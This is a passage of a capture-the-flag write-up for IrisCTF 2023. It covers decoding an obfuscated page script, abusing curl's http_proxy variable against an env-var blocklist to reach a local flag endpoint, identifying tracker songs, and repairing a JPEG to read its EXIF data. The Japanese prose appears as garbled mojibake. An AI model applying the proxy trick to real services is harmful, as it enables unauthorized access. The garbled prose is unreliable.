fOOir2VRb23/9YogmxZGej0xIA9L6EuPpfoFTxmzoGdxH7y36BWbvpxJWFMs8PsCImML9Xu2zzuKV2JfDfxXLzvoQ4PGPsy0ef/bvt27M3A1qD1ddhvir7HFosu42N7nKX9RHVynmd67aVl7jDuej40tKZF1l3joIUNP9huVr1SVPze915r6LCO2wvJz5dwyyoHlAD5ceCfYlRPoq5RNFpsC5sLKPi5Qcc6SbBOCdPUOV5M9FkDnAxHvtC37dIpXpeaSd3+Bvr26g6LAnfepYU0eTPFTo9/jj1YN28CNtoLBljJyAYUU8VRjvRnu1F96U2TnB0RVS5Q3Agx/xj9vWTx0iU1e8HAY0vRoYcfbAx2R89sDaYSovi+qTrpHCkab1kAFAl3xLrqvEuOEx60mdHA+APZvdi5tgPD8KS+n11FnpcLHz/+9ZqSfzMpwFsCKOXrrFMjEN5ysMVGJ5Jg5tIZt9naXHfJededSh3K1S8v8fFLZP2Q0CM7WLB/NKKIYwy5Z+FF8wKBzePXw9gKncaZQWz8xEedEUablbiSrHriVa9UCMwhvOugkIGDbXdD8BLVyABox+mpQDRNoTQnn4XN41F/OiLN/PgLPOklAwujqFQ/c0lcLd0Yml3ZYiE6D3pvrbQBDd9Gi8U5tz9CjMPGTE2CyyRzeYrhqaEf3g3VsmOHiR5XcWGiiVNPPm1jvlSUiXBFG8R8SLvOzyU+hdAoC6nPuEsJVSKMsO7B+iv/XBw/B2et+BAhY/9teDVSQIqlRyFQmYXO8jcZDtGkcHjkMVHtXp2ikbASWUOI0iUZ6eEE7fHEWWX/aECyVyP4qTeFR11qfJpEkOmxcsCRrghqAclwIe31hI6WKYq2i5RyOBZPW65vW+ntHWEt9Uq2abxEw4mYRP7xZ1Z0w+RwzhlDtbQvEHnlHsNQYZkstgm4Fm2Pdne5qDpTUmaGSPWbCg2k0Tnk3lh2cxTrNHnG6OD13f96qio2CN/BxSOztx8L+pykJXSo46zCmfW53QPSusKkom77xdyfUEJpn0jBT4MSajdYMQXmhMZGQzk6MI2rCPODhkTgc9hGxoqLt/SjLwslK/wz/gUWgorjczxCZG0vuhHwmAK7rpP+SqJhHuZgqavgq89H6IaKDaKv3QQuaO0VAXzwVeFRtyHhKqBra61hMviR16wqgys2sK8corrRtXfBhSnYLPXgbeV2qaRjPVSKm8lzeeKAy+HSfc95wBXMpPVuhWXpegOlhHE7HdFHgxr+rXzGfKlf1rN0bpU3RuPX5YdCC5B1lBiWVxaJx1nLbnkcE7T2laYG0DudU4NFRZHRDjhOl6eFME/53v7Y4oQXOvN4WuiEkWi82mPAYa2FWIai3SHuuthpy1pN+4NAgok/UVPf076IGIl29maCnj5SfjE3TXp8YdjoFIsYS+DbXFjuE4zF+qRJJQAfiaxsWmvHbDP9kto+8d/P13jmNNn4ti78nwB37z6SZQ4FPXhH31iK3c9LqZ/elnaxQeyZcpSTFQDhWhupVs09YyeH46A+f4hUD1UQOJL8yjeqOLXJhjF+S3XjbSQ5S65+qd+g==";
    const expected_h = [
      0x2b47n,
      0x2ec76n,
      0x31e0f8n,
      0x34ffd37n,
      0x384feac4n,
      0x3bd4ea3c3n,
      0x3f9238ecb2n,
      0x438b5c7e540n,
      0x47c412466529n,
      0x4c40536acd1d6n,
      0x510458a17a1b46n,
      0x56149e2b91bfcc8n,
      0x5b75e80e4adbe365n,
      0x12d468f2f89a4375n,
      0x401af822823e94e2n,
      0x41ca7a4aa6280cc2n,
      0x5e721ef508a904f2n,
      0x45940e4593396e2fn,
      0x9ed4f29ec6d07adfn,
      0x8c241c8b33d8358en,
    ];
    function checkLocalStorage() {
      !localStorage.getItem("b") || !localStorage.getItem("h")
        ? (init(), setLocalStrage())
        : ((d = localStorage.getItem("d")),
          (b = BigInt(localStorage.getItem("b"))),
          (h = JSON.parse(localStorage.getItem("h")).map((arg) =>
            BigInt(arg)
          )));
    }
    function setLocalStrage() {
      localStorage.setItem("d", d),
        localStorage.setItem("b", b.toString()),
        localStorage.setItem(
          "h",
          JSON.stringify(h.map((arg) => arg.toString()))
        );
    }
    function init() {
      (d = ""), (b = 0x17n), (h = []);
    }
    function existsCategoryNameClass() {
      return (
        document.getElementsByClassName("category-name").length != 0x0
      );
    }
    function calcFromCategoryName() {
      let categoryName =
          document.getElementsByClassName("category-name")[0x0][
            "textContent"
          ],
        b =
          categoryName.charCodeAt(0x1) * categoryName.charCodeAt(0x6) -
          categoryName.charCodeAt(0x3),
        d = categoryName[0x1] + categoryName[0x6] + categoryName[0x3];
      return [b, d];
    }
    async function decrypto(enc_image, d) {
      const _d = new TextEncoder().encode(d),
        keyData = await crypto.subtle.digest("SHA-256", _d),
        string_iv = atob(enc_image).slice(0x0, 0xc),
        iv = new Uint8Array(
          Array.from(string_iv).map((arg) => arg.charCodeAt(0x0))
        ),
        algorithm = {
          name: "AES-GCM",
          iv: iv,
        },
        key = await crypto.subtle.importKey(
          "raw",
          keyData,
          algorithm,
          false,
          ["decrypt"]
        ),
        string_data = atob(enc_image).slice(0xc),
        data = new Uint8Array(
          Array.from(string_data).map((arg) => arg.charCodeAt(0x0))
        );
      try {
        const input = await crypto.subtle.decrypt(algorithm, key, data),
          image = new TextDecoder().decode(input);
        return image;
      } catch (e) {
        throw new Error("Decrypt failed");
      }
    }
    async function changeBackgroundImage() {
      const image = await decrypto(enc_image, d);
      document["body"]["style"]["backgroundImage"] = image;
    }
    function checkLengthOfH() {
      if (h["length"] == expected_h["length"])
        return changeBackgroundImage(), true;
      return false;
    }
    function main() {
      checkLocalStorage();
      if (checkLengthOfH()) return;
      if (!existsCategoryNameClass()) {
        init(), setLocalStrage();
        return;
      }
      let [_b, _d] = calcFromCategoryName();
      b *= 0x11n;
      b += BigInt(_b);
      b &= 0xffffffffffffffffn;
      d += _d;
      h.push(b);
      if (h["length"] == expected_h["length"])
        for (let idx = 0x0; idx < h["length"]; idx++) {
          if (h[idx] != expected_h[idx]) {
            init(), setLocalStrage();
            return;
          }
        }
      setLocalStrage(), checkLengthOfH();
    }
    main();
  })();
});
```

ç°¡åã«èª¬æããã¨ãä»¥ä¸ã®å¦çããã¦ãã¾ãã

1. `b = 23n, d = "", h = []` ã§åæå
1. åé¡ã®ã«ãã´ãªãã¼ã¸ãéãåº¦ã«ãã«ãã´ãªå(`categoryName`)ãç¨ãã¦ä»¥ä¸ã®å¦çãå®è¡
    1. `_b = categoryName.charCodeAt(1) * categoryName.charCodeAt(6) - categoryName.charCodeAt(3)`
    1. `_d = categoryName[1] + categoryName[6] + categoryName[3]`
    1. `b = ((b * 17n) + _b) & 0xffffffffffffffffn`, `d += _d`, `h += b`
    1. `h` ã¨ `expected_h` ãç­ãããã° `enc_image` ãå¾©å·ãã¦èæ¯ã«è¨­å®

2çªç®ã®å¦çãå¨ã«ãã´ãªåã«ã¤ãã¦ã·ãã¥ã¬ã¼ã·ã§ã³ãã`expected_h` ã®è¦ç´ ã¨ç­ãããªããããªã«ãã´ãªåãæ¢ããã¨ã§ãã«ãã´ãªãé¸æããé çªãåããã¾ãã

ãªããåé¡ãã¼ã¸ã¯ãã®ããã«9ã¤ã®ã«ãã´ãªã§ãã¼ã¸ãåãããã¦ãã¾ãã

![](/images/iris-ctf-2023-writeup/2023-01-14-18-52-25.png)

Solver ã¯ä»¥ä¸ã®éãã§ãã
```python
categories = ['Binary Exploitation', 'Cryptography', 'Forensics', 'Miscellaneous',
              'Networks', 'Radio Frequency', 'Reverse Engineering', 'Web Exploitation', 'Welcome']
expected_h = [
    0x2b47,
    0x2ec76,
    0x31e0f8,
    0x34ffd37,
    0x384feac4,
    0x3bd4ea3c3,
    0x3f9238ecb2,
    0x438b5c7e540,
    0x47c412466529,
    0x4c40536acd1d6,
    0x510458a17a1b46,
    0x56149e2b91bfcc8,
    0x5b75e80e4adbe365,
    0x12d468f2f89a4375,
    0x401af822823e94e2,
    0x41ca7a4aa6280cc2,
    0x5e721ef508a904f2,
    0x45940e4593396e2f,
    0x9ed4f29ec6d07adf,
    0x8c241c8b33d8358e,
]

def calc(category):
    return ord(category[1]) * ord(category[6]) - ord(category[3])

prev_b = 23
cnt = 0
for b in expected_h:
    for category in categories:
        _b = ((prev_b * 17) + calc(category)) & 0xffffffffffffffff
        if _b == b:
            cnt += 1
            print(cnt, category)
    prev_b = b
```

ãã®ã³ã¼ãã®åºåãããä»¥ä¸ã®é çªã«ã«ãã´ãªãé¸æããã°ãããã¨ãåããã¾ãã
```
1 Networks
2 Binary Exploitation
3 Forensics
4 Binary Exploitation
5 Radio Frequency
6 Binary Exploitation
7 Binary Exploitation
8 Cryptography
9 Miscellaneous
10 Radio Frequency
11 Web Exploitation
12 Forensics
13 Radio Frequency
14 Networks
15 Radio Frequency
16 Networks
17 Web Exploitation
18 Radio Frequency
19 Networks
20 Binary Exploitation
```

å®éã«åé¡ãã¼ã¸ã§ãã®é çªã«ã«ãã´ãªãé¸æããã¨èæ¯ãå¤ããã¾ãã
![](/images/iris-ctf-2023-writeup/2023-01-14-14-25-00.png)

ããã­ãããã¼ã«ã§èæ¯ãæ½åºããã¨ãã©ã°ãåå¾ã§ãã¾ãã

![](/images/iris-ctf-2023-writeup/2023-01-14-14-29-30.png)
`flag: irisctf{ponies_who_eat_rainbows_and_poop_butterflies}`

# Misc
## Host Issues (20 solves)
![](/images/iris-ctf-2023-writeup/2023-01-09-18-04-55.png)

2ã¤ã® Python ã³ã¼ããéå¸ããã¦ãã¾ãã

1ã¤ç®ã¯ Flask è£½ã®ãµã¼ãã§ãã
```python:chal_serv.py
from flask import Flask, request
import string
from base64 import urlsafe_b64decode as b64decode

app = Flask(__name__)

BAD_ENV = ["LD", "LC", "PATH", "ORIGIN"]

@app.route("/env")
def env():
    data = b64decode(request.args['q']).decode()
    print(data)
    if any(c in data.upper() for c in BAD_ENV) \
            or any(c not in string.printable for c in data):
        return {"ok": 0}
    return {"ok": 1}

@app.route("/flag")
def flag():
    with open("flag", "r") as f:
        flag = f.read()
    return {"flag": flag}

app.run(port=25566)
```
ãã®ãµã¼ãã¯ãã¯ã¨ãªã `BAD_ENV` ã«è©²å½ãã¦ãããå¤å®ããã¨ã³ããã¤ã³ãã¨ flag ãè¿ãã¨ã³ããã¤ã³ããæã£ã¦ãã¾ãã

2ã¤ç®ã¯ãã¬ã¤ã¤ã¼ãããåãããã¯ã©ã¤ã¢ã³ãã§ãã
```python:chal.py
import os
import subprocess
import json
from base64 import urlsafe_b64encode as b64encode

BANNER = """

Welcome to my insecure temporary data service!
1) Write data
2) Read data

"""

REMOTE = "http://0:25566/"

def check(url):
    return json.loads(subprocess.check_output(["curl", "-s", url]))

print(BANNER)
while True:
    choice = input("> ")
    try:
        print(check("http://flag_domain:25566/flag"))
    except subprocess.CalledProcessError: pass
    try:
        if choice == '1':
            env = input("Name? ")
            if check(REMOTE + "env?q=" + b64encode(env.encode()).decode())["ok"]:
                os.environ[env] = input("Value? ")
            else:
                print("No!")
        elif choice == '2':
            env = input("Name? ")
            if check(REMOTE + "env?q=" + b64encode(env.encode()).decode())["ok"]:
                if env in os.environ:
                    print(os.environ[env])
                else:
                    print("(Does not exist)")
            else:
                print("No!")
        else:
            print("Bye!")
            exit()

    except Exception as e:
        print(e)
        exit()
```

ãã®ã¯ã©ã¤ã¢ã³ãã¯ç°å¢å¤æ°ãè¨­å®ã»åå¾ããæ©è½ãæã£ã¦ãã¾ãããã ããç°å¢å¤æ°ãè¨­å®ããéã«ãµã¼ãã«ãªã¯ã¨ã¹ããéãããã®å¤æ°åã `BAD_ENV` ã«è©²å½ãã¦ããå ´åã¯ç°å¢å¤æ°ãè¨­å®ããã¾ããã
æ©è½é¸æå¾ã« `http://flag_domain:25566/flag` ã¸ãªã¯ã¨ã¹ããéã£ã¦ãã¾ããããã®ãã¡ã¤ã³ã¯ãµã¼ãã«ååè§£æ±ºã§ããªãããã`flag` ãåå¾ãããã¨ã¯ã§ãã¾ããã

ã¾ããèµ·åã¹ã¯ãªããã¯ä»¥ä¸ã§ãã

```shell
#!/bin/bash
(&>/dev/null python3 /home/user/chal_serv.py)&
python3 /home/user/chal.py 2>&1
```

ã¯ã©ã¤ã¢ã³ããããµã¼ãã¸ã®ãªã¯ã¨ã¹ãã« curl ãä½¿ç¨ãã¦ããã®ãæªããã®ã§ãcurl ã«é¢ããç°å¢å¤æ°ã§ä½¿ããããªãã®ããªããèª¿ã¹ã¾ãã
`curl environment` ã§èª¿ã¹ãã¨ãcurl ã«ã¯ http_proxy ã¨ããç°å¢å¤æ°ããããã¨ãåããã¾ãã
https://curl.se/libcurl/c/libcurl-env.html

ãã®ç°å¢å¤æ°ã« `http://0:25566` ãè¨­å®ãããã¨ã§ã `http://0:25566/flag` ã¸ proxy ãããflag ãåå¾ãããã¨ãã§ãã¾ãã
Solver ã¯ä»¥ä¸ã®éãã§ãã
```python
from pwn import *

print(r.recvuntil("> "))
r.sendline(b"1")
r.recvuntil("Name? ")
r.sendline(b"http_proxy")
r.recvuntil("Value? ")
r.sendline(b"http://0:25566/")
print(r.recvuntil("> "))
r.sendline(b"1")
r.interactive()
```

`flag: irisctf{very_helpful_error_message}`

PS: æ³å®è§£ã¯ `RESOLV_HOST_CONF` ã¨ããç°å¢å¤æ°ãè¨­å®ããååè§£æ±ºæã« `./flag` ãèª­ã¿è¾¼ã¾ãããã¼ã¹å¤±ææã®ã¨ã©ã¼ãè¦ãæ¹æ³ã§ããã
(ç¢ºãã«ãèªåã®è§£æ³ã¯ã¨ã©ã¼ã¡ãã»ã¼ã¸ãä½¿ã£ã¦ããªããã¨ãããããµã¼ãã¨ã¯ã©ã¤ã¢ã³ããåããã¹ãä¸ã«ãããã¨ããå¿ãã¦ããã)

## Name that song (43 solves)
![](/images/iris-ctf-2023-writeup/2023-01-09-18-48-53.png)

file ã³ãã³ãã§éå¸ãã¡ã¤ã«ã®æå ±ãèª¿ã¹ã¾ãã
```shell
$ file song_1.it
song_1.it: Impulse Tracker module sound data - "redacted" compatible w/ITv5125 created w/ITv214
```
Impulse Tracker ã¨ããã·ã¼ã±ã³ãµã¼ã§ä½¿ããã¦ããé³æ¥½ãã¡ã¤ã«ã®ããã§ãã

Impulse Tracker ã§æ¤ç´¢ãã¦ã¿ãã¨ãSchism Tracker ã¨ãããã¬ã¼ã¤ã¼ãããã®ã§ãããä½¿ã£ã¦ãã¡ã¤ã«ãéãã¦ã¿ã¾ãã

https://schismtracker.org/

![](/images/iris-ctf-2023-writeup/2023-01-09-18-55-08.png)

å·¦ä¸ã«æ¥½å¨ã®æå ±ãè¼ã£ã¦ãã¾ãã155CHING.WAV ã§æ¤ç´¢ãã¦ã¿ãã¨ãä»¥ä¸ã®ãµã¤ããå¼ã£æããã¾ãã

https://modarchive.org/index.php?request=view_by_moduleid&query=173872

ãã® The Mod Archive ã¨ãããµã¤ãã¯ Impulse Tracker ã®æ²ãã¾ã¨ãããµã¤ãã§ãããµã¤ãä¸ã§æ²ãè´ããã¨ãã§ãã¾ãã
ãã®æ²ãè´ãã¦ã¿ãã¨éå¸ãããæ²ã¨ã¯éãã¾ãã

ãã®ãµã¤ãã«ã¯æ²ãæ¤ç´¢ããæ©è½ãããã¾ãã
<https://modarchive.org/index.php?request=view_searchbox>

Instrument Text ãé¸æãã 155CHING ã§æ¤ç´¢ããã¨30åã»ã©ããããã¾ãã
1ã¤ãã¤åçãã¦ããã¨ãéå¸ãããæ²ã moon gun ã¨ããæ²åã§ãããã¨ãåããã¾ãã

`flag: irisctf{moon_gun}`

## Name that song 2 (19 solves)
![](/images/iris-ctf-2023-writeup/2023-01-09-19-10-50.png)

éå¸ãã¡ã¤ã«ã Schism Tracker ã§éãã¾ãã
åçã¯ã§ãã¾ãããåé¡æã«æ¸ãã¦ããéããæ¥½å¨æå ±ãããã¾ããã

åã»ã©ã®æ¤ç´¢ãã¼ã¸ãæ´ã«èª¿ã¹ãã¨ãFile Size ã¨ File Format ã§ãã£ã«ã¿ã¼ã§ãããã¨ãåããã¾ãã
ã¾ããæ¤ç´¢ã¯ã¼ãã¯3æå­ä»¥ä¸è¦æ±ããã¾ãããæ­£è¦è¡¨ç¾ã«å¯¾å¿ãã¦ããããã `***` ã§å¨æ²ãæ¤ç´¢å¯¾è±¡ã«ã§ãã¾ãã

éå¸ãã¡ã¤ã«ã®ãµã¤ãºã¯ 651880 B = 636.6 KB ãªã®ã§ãFile Size Range: 600 - 999 Kb, File Format: MOD ã§ãã£ã«ã¿ã¼ãã `***` ã§æ¤ç´¢ãã¾ãã

ããªãã®æ°ãããããã¾ãããFile Sizeã 636KB ã®ãã®ã«çµã£ã¦èª¿ã¹ã¦ããã¨ãéå¸ãããæ²ã hit and run ã¨ããæ²åã§ãããã¨ãåããã¾ãã

`flag: irisctf{hit_and_run}`

# Forensics
## babyforens (105 solves)
![](/images/iris-ctf-2023-writeup/2023-02-15-22-16-32.png)

éå¸ãããç»åãã¡ã¤ã«ã®ä»¥ä¸ã®æå ±ãåå¾ããã°è§£ããã¨ãåºæ¥ã¾ãã
- æ®å½±å ´æã®ç·¯åº¦(latitude)
- æ®å½±å ´æã®çµåº¦(longitude)
- æ®å½±ããã¨ããã¯ç§(epochtime)
- æ®å½±ã«ä½¿ã£ãã«ã¡ã©ã®ã·ãªã¢ã«ãã³ãã¼(serial)
- ç»åã«å«ã¾ãã¦ããã·ã¼ã¯ã¬ããæå­å(secret)

ã¾ããç»åãã¡ã¤ã«ãéãã¦ã¿ããã¨ãã¾ãããã¨ã©ã¼ã§éããã¨ãåºæ¥ã¾ããã
åé¡æã«æ¸ãã¦ããéãããã¤ããªã®åé ­ãå£ããã¦ãã¦jpegã®ãã¡ã¤ã«ãã©ã¼ãããã«ãªã£ã¦ãã¾ããã
```
$ hexdump -C img_0917.jpg | head -n2
00000000  00 00 00 00 00 00 00 00  00 00 00 00 01 01 00 48  |...............H|
00000010  00 48 00 00 ff e1 56 bc  45 78 69 66 00 00 49 49  |.H....V.Exif..II|
```
ãããããæ­£å¸¸ãªjpegãã¡ã¤ã«ããã¦ã³ã­ã¼ããããã¤ããªãè¦ã¦ã¿ãã¨åé ­ã¯ä»¥ä¸ã®ããã«ãªã£ã¦ãã¾ãã
```
$ hexdump -C unbroken.jpg | head -n2
00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 01 00 48  |......JFIF.....H|
00000010  00 48 00 00 ff db 00 43  00 06 04 05 06 05 04 06  |.H.....C........|
```
ãããåèã«ãé©å½ãªãã¤ããªã¨ãã£ã¿ãä½¿ç¨ãã¦ãã¡ã¤ã«ãã©ã¼ããããä¿®æ­£ããã¨ãç»åãéããã¨ãåºæ¥ã¾ãã
![](/images/iris-ctf-2023-writeup/2023-01-14-11-10-49.png)

secret ã¯ `exif_data_can_leak_a_lot_of_info` ã§ãã

ã§ã¯ãæ®ãã®æå ±ãèª¿ã¹ã¦ããã¾ããsecretã«ãæ¸ãã¦ããããã«ãç·¯åº¦çµåº¦ãæéãã«ã¡ã©ã®æå ±ãªã©ã¯ç»åãã¡ã¤ã«ã®Exifæå ±ã«å«ã¾ãã¦ãã¾ãã
Exifæå ±ãåå¾ãããã¼ã«ã¨ãã¦ exiftool ãããã¾ããã Aperi'Solve ã¨ãããªã³ã©ã¤ã³ä¸ã§ç»åã®åæãåºæ¥ããã¼ã«ãããã®ã§ãã¡ããä½¿ç¨ãã¾ãã

https://www.aperisolve.com/

ç»åãã¢ããã­ã¼ãããExiftool ã®æ¬ããé¢é£ããæå ±ãåå¾ãã¾ãã

- GPSLatitude:	37 deg 44' 49.46"; N
- GPSLongitude:	119 deg 35' 46.77"; W
- CreateDate:	2022:08:27 10:04:56
- TimeZone:	-08:00
- TimeZoneCity:	Los Angeles
- SerialNumber:	392075057288

ç·¯åº¦ã»çµåº¦ãåããã¾ããããåº¦åç§(60é²æ°)ã§è¨è¼ããã¦ãã10é²æ°ã«å¤æããå¿è¦ãããã¾ããã¾ããå°æ°ç¬¬3ä½ãåãæ¨ã¦ã¾ãã

- latitude: `37 + 44 / 60 + 49.46 / 3600 = 37.74` (Northã¯æ­£)
- longitude: `-(119 + 35 / 60 + 46.77 / 3600) = -119.59` (Westã¯è² )

ç¶ãã¦ãæ®å½±ããã¨ããã¯ç§ãèª¿ã¹ã¾ãã2022:08:27 10:04:56 ã«æ®å½±ãã¦ãããLos Angeles ã® Timezone ã§ã¨ããã¯ç§ã«å¤æãã¾ãã
ä»¥ä¸ã®ãµã¤ãã§å¤æããã¨ã1661619896 ã«ãªãã¾ãã
http://tools.up2a.info/ja/epochtimes

ã·ãªã¢ã«ãã³ãã¼ã¯ãã®ã¾ã¾ 392075057288 ã§ãã

ä»¥ä¸ã§ãã©ã°ãåå¾ã§ãã¾ãã

`flag: irisctf{37.74_-119.59_1661619896_392075057288_exif_data_can_leak_a_lot_of_info}`
